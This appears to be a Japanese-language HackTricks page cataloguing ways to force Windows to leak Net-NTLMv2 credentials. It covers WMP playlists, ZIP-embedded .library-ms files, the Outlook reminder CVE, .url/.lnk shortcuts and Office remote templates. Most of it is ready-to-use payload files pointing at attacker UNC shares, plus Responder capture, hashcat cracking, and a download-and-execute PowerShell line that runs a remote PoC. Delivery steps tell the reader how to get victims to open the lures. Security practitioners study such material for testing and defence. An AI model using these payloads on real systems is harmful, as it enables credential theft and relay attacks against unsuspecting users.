# NTLM creds を盗む場所

{{#include ../../banners/hacktricks-training.md}}

**以下の参考をすべて確認してください: [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — オンラインでの microsoft word ファイルのダウンロードから ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md および [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player プレイリスト (.ASX/.WAX)

ターゲットにあなたが作成した Windows Media Player プレイリストを開かせるかプレビューさせることができれば、エントリを UNC path に向けることで Net‑NTLMv2 を leak できます。WMP は参照されたメディアを SMB 経由で取得しようとし、暗黙的に認証を行います。

Example payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
収集とクラックのフロー:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer は、ZIP アーカイブ内から直接開かれた .library-ms ファイルを安全でない方法で処理します。ライブラリ定義がリモートの UNC パス（例：\\attacker\share）を指している場合、ZIP 内の .library-ms を参照または起動するだけで Explorer がその UNC を列挙し、attacker に対して NTLM 認証を送出します。これにより NetNTLMv2 が得られ、オフラインでクラッキングできるか、あるいは潜在的に relayed される可能性があります。

Minimal .library-ms pointing to an attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- .library-ms ファイルを上記の XML で作成します（IP/hostname を設定してください）。
- それを ZIP 圧縮し（on Windows: Send to → Compressed (zipped) folder）ターゲットに配布します。
- NTLM capture listener を実行し、被害者が ZIP 内から .library-ms を開くのを待ちます。


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows はカレンダー項目の拡張 MAPI プロパティ PidLidReminderFileParameter を処理していました。もしそのプロパティが UNC パス（例: \\attacker\share\alert.wav）を指していると、リマインダー発火時に Outlook は SMB share に接続し、ユーザーの Net‑NTLMv2 をクリック不要で leak してしまいます。これは March 14, 2023 に修正されましたが、レガシー／未更新の環境や過去のインシデント対応では依然として重要です。

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
リスナー側:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notes
- 被害者は、リマインダーが発動したときに Outlook for Windows が実行されているだけで十分です。
- この leak は Net‑NTLMv2 を生成し、offline cracking や relay に適しています（pass‑the‑hash ではありません）。


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer はショートカットのアイコンを自動的にレンダリングします。最近の調査により、Microsoft の 2025年4月 の UNC‑icon ショートカット向けパッチ適用後でも、ショートカットのターゲットを UNC パス上にホストしアイコンをローカルに保持することで、クリックなしで NTLM 認証をトリガーできることが示されました（パッチバイパスとして CVE‑2025‑50154 が割り当てられています）。フォルダを表示するだけで、Explorer がリモートターゲットからメタデータを取得し、NTLM を攻撃者の SMB サーバーへ送信します。

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
PowerShell を使用したプログラムショートカット payload (.lnk):
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- Drop the shortcut in a ZIP and get the victim to browse it.
- Place the shortcut on a writable share the victim will open.
- Combine with other lure files in the same folder so Explorer previews the items.


### Office リモートテンプレート注入 (.docx/.dotm) — NTLM 認証を強制する方法

Office ドキュメントは外部テンプレートを参照できます。添付テンプレートを UNC パスに設定すると、ドキュメントを開いた際に SMB に対して認証が行われます。

Minimal DOCX relationship changes (inside word/):

1) Edit word/settings.xml and add the attached template reference:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) word/_rels/settings.xml.rels を編集し、rId1337 をあなたの UNC に向けてください:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) .docx に再パックして配布します。SMB キャプチャリスナーを起動して、開かれるのを待ちます。

キャプチャ後に NTLM をリレーしたり悪用するためのアイデアは、以下を確認してください:

{{#ref}}
README.md
{{#endref}}


## 参考

- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
